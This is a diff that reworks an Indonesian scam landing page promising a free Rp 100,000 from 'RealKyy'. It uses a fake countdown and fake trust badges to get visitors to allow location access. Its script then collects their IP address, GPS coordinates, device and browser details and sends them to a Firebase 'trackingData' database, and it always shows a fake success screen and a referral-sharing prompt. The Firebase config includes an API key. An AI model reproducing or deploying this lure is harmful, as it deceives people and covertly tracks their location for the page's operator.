@@ -3,31 +3,54 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Dapatkan Rp 100.000 gratis dari RealKyy sekarang juga!">
     <title>Dapatkan Rp 100.000 dari RealKyy!</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+    <!-- Favicon -->
+    <link rel="icon" href="icon.png" type="image/x-icon">
+    <link rel="shortcut icon" href="icon.png" type="image/x-icon">
+    <!-- Fonts and Icons -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
+        :root {
+            --primary-color: #e84393;
+            --secondary-color: #d63031;
+            --accent-color: #fd79a8;
+            --text-color: #333;
+            --light-color: #f8f9fa;
+            --dark-color: #2d3436;
+            --success-color: #00b894;
+            --warning-color: #fdcb6e;
+            --error-color: #d63031;
+            --border-radius: 12px;
+            --box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+            --transition: all 0.3s ease;
+        }
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Poppins', sans-serif;
         }
-        
+
         body {
-            background-color: #f8f9fa;
-            color: #333;
+            font-family: 'Poppins', sans-serif;
             line-height: 1.6;
+            color: var(--text-color);
+            background-color: var(--light-color);
             min-height: 100vh;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
             padding: 20px;
         }
-        
-        .permission-overlay {
+
+        /* Overlay Styles */
+        .overlay {
             position: fixed;
             top: 0;
             left: 0;
@@ -35,155 +58,211 @@
             height: 100%;
             background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
             padding: 20px;
-            text-align: center;
             z-index: 1000;
+            overflow-y: auto;
         }
-        
+
         .container {
             background-color: white;
-            border-radius: 20px;
+            border-radius: var(--border-radius);
             padding: 30px;
+            width: 100%;
             max-width: 500px;
-            width: 90%;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            box-shadow: var(--box-shadow);
             text-align: center;
+            margin: auto;
         }
-        
+
+        /* Header Styles */
+        .money-animation {
+            font-size: clamp(50px, 8vw, 70px);
+            margin: 10px 0;
+            animation: bounce 2s infinite;
+        }
+
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-20px); }
+            60% { transform: translateY(-10px); }
+        }
+
         h1 {
-            color: #d63031;
+            color: var(--secondary-color);
+            font-size: clamp(22px, 5vw, 28px);
             margin-bottom: 15px;
-            font-size: 28px;
-        }
-        
-        p {
-            margin-bottom: 20px;
-            font-size: 16px;
-        }
-        
-        .highlight {
-            color: #d63031;
             font-weight: 700;
-            font-size: 24px;
         }
-        
+
+        p {
+            font-size: clamp(14px, 3vw, 16px);
+            margin-bottom: 20px;
+            color: var(--dark-color);
+        }
+
+        .highlight {
+            color: var(--secondary-color);
+            font-weight: 700;
+            font-size: clamp(20px, 5vw, 24px);
+            margin: 10px 0;
+        }
+
+        /* Button Styles */
         .btn {
-            background-color: #e84393;
+            background-color: var(--primary-color);
             color: white;
             border: none;
-            padding: 15px 30px;
-            font-size: 18px;
+            padding: 12px 25px;
+            font-size: clamp(14px, 4vw, 18px);
             border-radius: 50px;
             cursor: pointer;
-            margin: 20px 0;
-            transition: all 0.3s;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            margin: 15px 0;
+            transition: var(--transition);
+            box-shadow: 0 4px 12px rgba(232, 67, 147, 0.3);
             font-weight: 600;
             width: 100%;
             max-width: 300px;
+            display: inline-block;
+            text-decoration: none;
         }
-        
+
         .btn:hover {
-            background-color: #fd79a8;
+            background-color: var(--accent-color);
             transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+            box-shadow: 0 8px 20px rgba(253, 121, 168, 0.4);
         }
-        
-        .hidden {
-            display: none;
+
+        .btn:active {
+            transform: translateY(1px);
         }
-        
+
+        .btn-secondary {
+            background-color: white;
+            color: var(--primary-color);
+            border: 2px solid var(--primary-color);
+        }
+
+        /* Steps Styles */
         .steps {
             text-align: left;
             margin: 20px 0;
         }
-        
+
         .step {
             display: flex;
             margin-bottom: 15px;
-            align-items: center;
+            align-items: flex-start;
         }
-        
+
         .step-number {
-            background-color: #e84393;
+            background-color: var(--primary-color);
             color: white;
-            width: 30px;
-            height: 30px;
+            min-width: 28px;
+            height: 28px;
             border-radius: 50%;
             display: flex;
             justify-content: center;
             align-items: center;
             margin-right: 15px;
             font-weight: bold;
+            font-size: 14px;
+            flex-shrink: 0;
         }
-        
+
         .step-text {
             flex: 1;
+            font-size: clamp(13px, 3vw, 15px);
         }
-        
-        .money-animation {
-            font-size: 60px;
-            margin: 20px 0;
-            animation: bounce 2s infinite;
+
+        /* Countdown Styles */
+        .countdown {
+            font-size: clamp(16px, 4vw, 18px);
+            font-weight: bold;
+            color: var(--secondary-color);
+            margin: 15px 0;
+            padding: 8px 15px;
+            background-color: rgba(255, 255, 255, 0.7);
+            border-radius: 50px;
+            display: inline-block;
         }
-        
-        @keyframes bounce {
-            0%, 20%, 50%, 80%, 100% {transform: translateY(0);}
-            40% {transform: translateY(-30px);}
-            60% {transform: translateY(-15px);}
-        }
-        
+
+        /* Trust Badges */
         .trust-badges {
             display: flex;
             justify-content: center;
             flex-wrap: wrap;
-            gap: 15px;
+            gap: 10px;
             margin: 20px 0;
         }
-        
+
         .badge {
-            background-color: #f1f1f1;
-            padding: 8px 15px;
-            border-radius: 20px;
-            font-size: 12px;
+            background-color: rgba(255, 255, 255, 0.7);
+            padding: 6px 12px;
+            border-radius: 50px;
+            font-size: clamp(10px, 3vw, 12px);
             display: flex;
             align-items: center;
+            white-space: nowrap;
         }
-        
+
         .badge i {
             margin-right: 5px;
-            color: #e84393;
+            color: var(--primary-color);
+            font-size: 12px;
         }
-        
-        .countdown {
-            font-size: 18px;
-            font-weight: bold;
-            color: #d63031;
-            margin: 15px 0;
-        }
-        
+
+        /* Loading Animation */
         .loading {
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #e84393;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--primary-color);
             border-radius: 50%;
-            width: 50px;
-            height: 50px;
+            width: 40px;
+            height: 40px;
             animation: spin 1s linear infinite;
             margin: 20px auto;
         }
-        
+
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+
+        /* Hidden Elements */
+        .hidden {
+            display: none !important;
+        }
+
+        /* Responsive Adjustments */
+        @media (max-width: 480px) {
+            .container {
+                padding: 20px;
+            }
+            
+            .step {
+                margin-bottom: 12px;
+            }
+            
+            .btn {
+                padding: 10px 20px;
+            }
+        }
+
+        /* Animation for Success */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .fade-in {
+            animation: fadeIn 0.5s ease-out forwards;
+        }
     </style>
 </head>
 <body>
-    <!-- Overlay Permisi Lokasi -->
-    <div class="permission-overlay" id="permission-overlay">
+    <!-- Permission Overlay -->
+    <div class="overlay" id="permission-overlay">
         <div class="container">
             <div class="money-animation">💵</div>
             <h1>DAPATKAN RP 100.000 GRATIS!</h1>
@@ -206,18 +285,20 @@
             
             <div class="countdown" id="countdown">Penawaran berakhir dalam: 05:00</div>
             
-            <button class="btn" id="allow-btn">IZINKAN LOKASI SEKARANG</button>
+            <button class="btn" id="allow-btn">
+                <i class="fas fa-location-arrow" style="margin-right: 8px;"></i> IZINKAN LOKASI SEKARANG
+            </button>
             
             <div class="trust-badges">
-                <div class="badge"><i>✓</i> Aman & Terpercaya</div>
-                <div class="badge"><i>✓</i> 10.000+ Pengguna</div>
-                <div class="badge"><i>✓</i> Instant Transfer</div>
+                <div class="badge"><i class="fas fa-shield-alt"></i> Aman & Terpercaya</div>
+                <div class="badge"><i class="fas fa-users"></i> 10.000+ Pengguna</div>
+                <div class="badge"><i class="fas fa-bolt"></i> Instant Transfer</div>
             </div>
         </div>
     </div>
     
     <!-- Loading Screen -->
-    <div class="permission-overlay hidden" id="loading-screen">
+    <div class="overlay hidden" id="loading-screen">
         <div class="container">
             <div class="loading"></div>
             <h2>Memverifikasi lokasi Anda...</h2>
@@ -225,27 +306,34 @@
         </div>
     </div>
     
-    <!-- Konten Utama (akan muncul setelah izin diberikan) -->
-    <div class="container hidden" id="main-content">
-        <div class="money-animation">💰</div>
-        <h1>SELAMAT!</h1>
-        <p>Anda telah berhasil mengklaim hadiah dari RealKyy:</p>
-        <p class="highlight">Rp 100.000</p>
-        <p>Saldo akan dikirim ke akun Anda dalam 1x24 jam.</p>
-        <p><strong>No. Referral Anda:</strong></p>
-        <p style="font-size: 24px; font-weight: bold; color: #e84393;" id="referral-code">RKYY-XXXX-XXXX</p>
-        <p>Bagikan link referral ini untuk mendapatkan bonus tambahan!</p>
-        
-        <button class="btn" id="share-btn">BAGIKAN LINK REFERRAL</button>
-        
-        <div class="trust-badges">
-            <div class="badge"><i>✓</i> Transfer diproses</div>
-            <div class="badge"><i>✓</i> Jaminan uang masuk</div>
+    <!-- Success Content -->
+    <div class="overlay hidden" id="success-content">
+        <div class="container fade-in">
+            <div class="money-animation">💰</div>
+            <h1>SELAMAT!</h1>
+            <p>Anda telah berhasil mengklaim hadiah dari RealKyy:</p>
+            <p class="highlight">Rp 100.000</p>
+            <p>Saldo akan dikirim ke akun Anda dalam 1x24 jam.</p>
+            
+            <div style="margin: 20px 0; padding: 15px; background-color: #f8f9fa; border-radius: var(--border-radius);">
+                <p><strong>No. Referral Anda:</strong></p>
+                <p style="font-size: clamp(20px, 6vw, 24px); font-weight: bold; color: var(--primary-color); margin: 10px 0;" id="referral-code">RKYY-XXXX-XXXX</p>
+                <p>Bagikan link referral untuk mendapatkan bonus tambahan!</p>
+            </div>
+            
+            <button class="btn" id="share-btn">
+                <i class="fas fa-share-alt" style="margin-right: 8px;"></i> BAGIKAN LINK REFERRAL
+            </button>
+            
+            <div class="trust-badges">
+                <div class="badge"><i class="fas fa-check-circle"></i> Transfer diproses</div>
+                <div class="badge"><i class="fas fa-lock"></i> Jaminan uang masuk</div>
+            </div>
         </div>
     </div>
 
     <script>
-        // Konfigurasi Firebase
+        // Firebase Configuration
         const firebaseConfig = {
             apiKey: "AIzaSyCUbRuOhKQczZiRJXZe2DLZv4Z_57GsmzI",
             authDomain: "hadiah-hp-1b70e.firebaseapp.com",
@@ -261,62 +349,85 @@
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
+        // DOM Elements
+        const permissionOverlay = document.getElementById('permission-overlay');
+        const loadingScreen = document.getElementById('loading-screen');
+        const successContent = document.getElementById('success-content');
+        const allowBtn = document.getElementById('allow-btn');
+        const shareBtn = document.getElementById('share-btn');
+        const countdownElement = document.getElementById('countdown');
+        const referralCodeElement = document.getElementById('referral-code');
+
         // Generate random referral code
         function generateReferralCode() {
             const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ0123456789';
             let result = 'RKYY-';
+            
             for (let i = 0; i < 4; i++) {
                 result += chars.charAt(Math.floor(Math.random() * chars.length));
             }
+            
             result += '-';
+            
             for (let i = 0; i < 4; i++) {
                 result += chars.charAt(Math.floor(Math.random() * chars.length));
             }
+            
             return result;
         }
-        
+
         // Set referral code
         const referralCode = generateReferralCode();
-        document.getElementById('referral-code').textContent = referralCode;
-        
-        // Countdown timer
-        let timeLeft = 300; // 5 minutes in seconds
-        const countdownElement = document.getElementById('countdown');
-        
-        const countdownInterval = setInterval(() => {
+        referralCodeElement.textContent = referralCode;
+
+        // Countdown timer (5 minutes)
+        let timeLeft = 300;
+        const updateCountdown = () => {
             const minutes = Math.floor(timeLeft / 60);
             const seconds = timeLeft % 60;
             countdownElement.textContent = `Penawaran berakhir dalam: ${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
             
             if (timeLeft <= 0) {
                 clearInterval(countdownInterval);
-                document.getElementById('allow-btn').disabled = true;
+                allowBtn.disabled = true;
                 countdownElement.textContent = "Penawaran telah berakhir!";
-                countdownElement.style.color = "#ff0000";
+                countdownElement.style.color = '#d63031'; // Fixed error here - changed from var(--error-color) to actual color value
             }
             timeLeft--;
-        }, 1000);
-        
-        // Tangani permintaan izin lokasi
-        document.getElementById('allow-btn').addEventListener('click', async function() {
-            // Tampilkan loading screen
-            document.getElementById('permission-overlay').classList.add('hidden');
-            document.getElementById('loading-screen').classList.remove('hidden');
+        };
+
+        const countdownInterval = setInterval(updateCountdown, 1000);
+        updateCountdown(); // Initial call
+
+        // Handle location permission
+        allowBtn.addEventListener('click', async () => {
+            // Show loading screen
+            permissionOverlay.classList.add('hidden');
+            loadingScreen.classList.remove('hidden');
             
-            // Kumpulkan data dasar
+            // Collect basic user data
             const userData = {
                 timestamp: new Date().toISOString(),
                 referralCode: referralCode,
-                ip: await fetch('https://api.ipify.org?format=json').then(res => res.json()).catch(() => ({ip: 'unknown'})),
+                ip: { ip: 'unknown' }, // Default value
                 userAgent: navigator.userAgent,
                 screen: `${window.screen.width}x${window.screen.height}`,
                 language: navigator.language,
                 platform: navigator.platform,
                 referrer: document.referrer || 'direct',
-                urlParams: Object.fromEntries(new URLSearchParams(window.location.search))
+                urlParams: Object.fromEntries(new URLSearchParams(window.location.search)),
+                deviceType: /Mobi|Android/i.test(navigator.userAgent) ? 'mobile' : 'desktop'
             };
-            
-            // Coba dapatkan lokasi GPS
+
+            // Try to get IP address
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                userData.ip = await ipResponse.json();
+            } catch (error) {
+                console.error('Error getting IP:', error);
+            }
+
+            // Try to get GPS location
             if (navigator.geolocation) {
                 try {
                     const position = await new Promise((resolve, reject) => {
@@ -339,46 +450,66 @@
             } else {
                 userData.gpsError = "Geolocation not supported";
             }
-            
-            // Simpan data ke Firebase
+
+            // Save data to Firebase
             try {
                 const trackingRef = database.ref('trackingData');
                 const newDataRef = trackingRef.push();
                 await newDataRef.set(userData);
                 console.log('Data saved to Firebase:', userData);
                 
-                // Setelah 2 detik (untuk efek loading), tampilkan konten utama
+                // Show success screen after short delay
                 setTimeout(() => {
-                    document.getElementById('loading-screen').classList.add('hidden');
-                    document.getElementById('main-content').classList.remove('hidden');
-                }, 2000);
+                    loadingScreen.classList.add('hidden');
+                    successContent.classList.remove('hidden');
+                }, 1500);
                 
             } catch (error) {
                 console.error('Error saving to Firebase:', error);
-                // Tetap lanjutkan ke halaman sukses meskipun ada error Firebase
+                
+                // Fallback - still show success to user
                 setTimeout(() => {
-                    document.getElementById('loading-screen').classList.add('hidden');
-                    document.getElementById('main-content').classList.remove('hidden');
-                }, 2000);
+                    loadingScreen.classList.add('hidden');
+                    successContent.classList.remove('hidden');
+                }, 1500);
             }
         });
-        
-        // Tombol bagikan referral
-        document.getElementById('share-btn').addEventListener('click', function() {
-            const shareText = `Saya baru saja dapat Rp 100.000 gratis dari RealKyy! Gunakan kode referral saya: ${referralCode} atau klik link ini: ${window.location.href}?ref=${referralCode}`;
+
+        // Share referral link
+        shareBtn.addEventListener('click', () => {
+            const shareUrl = `${window.location.href.split('?')[0]}?ref=${referralCode}`;
+            const shareText = `Saya baru saja dapat Rp 100.000 gratis dari RealKyy! Gunakan kode referral saya: ${referralCode} atau klik link ini: ${shareUrl}`;
             
             if (navigator.share) {
                 navigator.share({
                     title: 'Dapatkan Rp 100.000 dari RealKyy!',
                     text: shareText,
-                    url: window.location.href
-                }).catch(console.error);
+                    url: shareUrl
+                }).catch(err => {
+                    console.error('Error sharing:', err);
+                    copyToClipboard(shareText);
+                });
             } else {
-                // Fallback untuk browser yang tidak support Web Share API
-                navigator.clipboard.writeText(shareText);
-                alert('Link referral telah disalin! Bagikan ke teman-teman Anda.');
+                copyToClipboard(shareText);
             }
         });
+
+        // Copy to clipboard fallback
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                alert('Link referral telah disalin! Silakan bagikan ke teman-teman Anda.');
+            }).catch(err => {
+                console.error('Could not copy text:', err);
+                prompt('Salin teks berikut untuk dibagikan:', text);
+            });
+        }
+
+        // Check for referral parameter
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.has('ref')) {
+            // You can track referrals here if needed
+            console.log('Referred by:', urlParams.get('ref'));
+        }
     </script>
 </body>
 </html>
